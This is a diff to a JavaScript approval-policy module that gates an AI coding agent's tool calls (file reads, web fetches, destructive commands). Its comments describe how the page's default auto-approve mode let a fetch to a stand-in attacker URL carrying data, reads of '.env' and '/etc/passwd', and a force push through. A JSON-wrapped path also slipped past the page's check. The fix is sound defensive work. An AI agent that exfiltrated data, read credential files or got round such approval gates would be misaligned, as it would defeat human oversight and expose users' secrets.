@@ -124,21 +124,41 @@ export const PATH_ARG = {
 /**
  * O veredito, em uma função pura — é ela que o teste exercita e o runner obedece.
  *
- * Devolve `{ acao: "allow"|"gate", motivo }`. Nunca `deny`: o que esta política não libera
- * vira **cartão**, não recusa — quem nega é o dev, olhando o preview.
+ * Devolve `{ acao: "allow"|"gate", motivo, politica? }`. Nunca `deny`: o que esta política não
+ * libera vira **cartão**, não recusa — quem nega é o dev, olhando o preview.
+ *
+ * ## `politica`: which card, and why it is part of the verdict (1.6.12)
+ *
+ * 🔴 A card is not a decision by itself: the PAGE decides what to do with it. Its Auto mode —
+ * the default, `localStorage.getItem('shvia.codeApproval') || 'auto'` in SHVIA-WEB's
+ * code-mode.js — approves by itself every `confirm` card it judges "inside the project", and
+ * measured on 23/09 with the page's own functions it judged these inside: `WebFetch
+ * https://attacker/?d=…`, `Read .env`, `Read /etc/passwd`, `git push --force`. Until 1.6.12
+ * every card here was `confirm`, so in the default mode the ADR-032 boundary was off: the
+ * cards were emitted, and approved by nobody. The tests above stayed green because they
+ * checked that the card is EMITTED, not what happens to it.
+ *
+ * `always` is the one policy the page never auto-approves and never offers "Sempre" for. So
+ * every card ADR-032 says asks "at any level" — network egress, a protected path, a
+ * destructive command — carries `always`. A card that only means "outside this project"
+ * stays `confirm`; the page judges that from the preview (see `previa`).
  */
 export function decidir({ projectDir, toolName, toolInput = {}, nivel = "manual", leitura, edicao }) {
   if (leitura.has(toolName)) {
     const alvo = toolInput[PATH_ARG[toolName]];
-    if (caminhoProibido(alvo)) return { acao: "gate", motivo: `leitura de caminho protegido (${alvo})` };
-    if (!dentroDoProjeto(projectDir, alvo)) return { acao: "gate", motivo: `leitura fora da pasta do projeto (${alvo})` };
+    if (caminhoProibido(alvo)) {
+      return { acao: "gate", motivo: `leitura de caminho protegido (${alvo})`, politica: "always" };
+    }
+    if (!dentroDoProjeto(projectDir, alvo)) {
+      return { acao: "gate", motivo: `leitura fora da pasta do projeto (${alvo})`, politica: "confirm" };
+    }
     return { acao: "allow", motivo: "leitura (auto)" };
   }
   if (toolName === "WebFetch" || toolName === "WebSearch") {
-    return { acao: "gate", motivo: "saída para a rede" };
+    return { acao: "gate", motivo: "saída para a rede", politica: "always" };
   }
   if (toolName === "Bash" && comandoDestrutivo(toolInput.command)) {
-    return { acao: "gate", motivo: "comando destrutivo" };
+    return { acao: "gate", motivo: "comando destrutivo", politica: "always" };
   }
   if (nivel !== "manual" && edicao.has(toolName)) {
     return { acao: "allow", motivo: `edição liberada pelo nível "${nivel}"` };
@@ -146,5 +166,56 @@ export function decidir({ projectDir, toolName, toolInput = {}, nivel = "manual"
   if (nivel === "auto") {
     return { acao: "allow", motivo: 'liberado pelo nível "auto"' };
   }
-  return { acao: "gate", motivo: "" };
+  return { acao: "gate", motivo: "", politica: "confirm" };
+}
+
+/**
+ * The card's preview — what the dev reads, and what the page's "inside the project?" check
+ * parses. It lives here, beside `decidir`, because the two must agree: a verdict of
+ * "outside the project" is only honored if the page can SEE the path.
+ *
+ * 🔴 Until 1.6.12 a read tool fell into the generic branch, `Read {"file_path":"/etc/passwd"}`.
+ * The page's check looks for an absolute path, `~` or `..` as a whitespace-separated token;
+ * inside JSON the path follows a `"`, so `Read /etc/passwd` read as "inside" and was
+ * auto-approved. A read shows its path as its own token now; the full input goes in `why`.
+ */
+export function previa(toolName, input) {
+  const inp = input || {};
+  if (toolName === "Bash") {
+    return {
+      kind: "command",
+      command: String(inp.command ?? ""),
+      why: String(inp.description ?? ""),
+    };
+  }
+  if (PATH_ARG[toolName] && inp[PATH_ARG[toolName]]) {
+    return {
+      kind: "command",
+      command: `${toolName} ${String(inp[PATH_ARG[toolName]])}`,
+      why: JSON.stringify(inp),
+    };
+  }
+  if (toolName === "Write") {
+    const path = String(inp.file_path ?? inp.path ?? "");
+    const body = String(inp.content ?? "");
+    const diff = body.split("\n").map((l) => "+ " + l).join("\n");
+    return { kind: "diff", path, diff };
+  }
+  if (toolName === "Edit" || toolName === "MultiEdit") {
+    const path = String(inp.file_path ?? "");
+    const edits =
+      toolName === "MultiEdit"
+        ? inp.edits ?? []
+        : [{ old_string: inp.old_string, new_string: inp.new_string }];
+    const diff = edits
+      .map((e) => {
+        const oldL = String(e?.old_string ?? "").split("\n").map((l) => "- " + l).join("\n");
+        const newL = String(e?.new_string ?? "").split("\n").map((l) => "+ " + l).join("\n");
+        return [oldL, newL].filter(Boolean).join("\n");
+      })
+      .join("\n");
+    return { kind: "diff", path, diff };
+  }
+  // fallback: descreve a chamada como comando (visível no card)
+  return { kind: "command", command: `${toolName} ${JSON.stringify(inp)}`, why: "" };
 }
